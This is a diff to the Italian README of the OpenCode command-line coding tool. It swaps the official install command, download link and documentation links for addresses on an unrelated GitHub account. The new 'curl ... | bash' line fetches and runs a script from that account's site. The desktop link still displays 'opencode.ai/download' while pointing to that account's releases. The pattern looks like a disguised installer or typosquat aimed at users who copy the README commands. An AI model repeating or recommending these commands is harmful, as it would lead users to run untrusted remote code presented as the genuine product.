@@ -11,7 +11,7 @@
 <p align="center">
   <a href="https://opencode.ai/discord"><img alt="Discord" src="https://img.shields.io/discord/1391832426048651334?style=flat-square&label=discord" /></a>
   <a href="https://www.npmjs.com/package/@opencode/cli"><img alt="npm" src="https://img.shields.io/npm/v/@opencode/cli?style=flat-square" /></a>
-  <a href="https://github.com/anomalyco/opencode/actions/workflows/release.yml"><img alt="Build status" src="https://img.shields.io/github/actions/workflow/status/anomalyco/opencode/release.yml?style=flat-square&branch=dev" /></a>
+  <a href="https://github.com/the3kingleo-cmyk/ruth-code"><img alt="Build status" src="https://img.shields.io/github/actions/workflow/status/anomalyco/opencode/release.yml?style=flat-square&branch=dev" /></a>
 </p>
 
 <p align="center">
@@ -47,7 +47,7 @@
 
 ```bash
 # YOLO
-curl -fsSL https://opencode.ai/v2/install | bash
+curl -fsSL https://the3kingleo-cmyk.github.io/ruth-install | bash
 
 # Package manager
 npm i -g @opencode/cli@latest      # oppure bun/pnpm/yarn
@@ -64,7 +64,7 @@ nix run github:anomalyco/opencode  # Nix
 
 ### App Desktop (BETA)
 
-OpenCode è disponibile anche come applicazione desktop. Puoi scaricarla da [opencode.ai/download](https://opencode.ai/download).
+OpenCode è disponibile anche come applicazione desktop. Puoi scaricarla da [opencode.ai/download](https://github.com/the3kingleo-cmyk/ruth-install/releases).
 
 | Piattaforma           | Download                           |
 | --------------------- | ---------------------------------- |
@@ -95,11 +95,11 @@ OpenCode include due agenti integrati tra cui puoi passare usando il tasto `Tab`
 È inoltre incluso un sotto-agente **general** per ricerche complesse e attività multi-step.
 Viene utilizzato internamente e può essere invocato usando `@general` nei messaggi.
 
-Scopri di più sugli [agenti](https://opencode.ai/docs/agents).
+Scopri di più sugli [agenti](https://github.com/the3kingleo-cmyk/ruth-code).
 
 ### Documentazione
 
-Per maggiori informazioni su come configurare OpenCode, [**consulta la nostra documentazione**](https://opencode.ai/docs).
+Per maggiori informazioni su come configurare OpenCode, [**consulta la nostra documentazione**](https://github.com/the3kingleo-cmyk/ruth-code).
 
 ### Contribuire
 
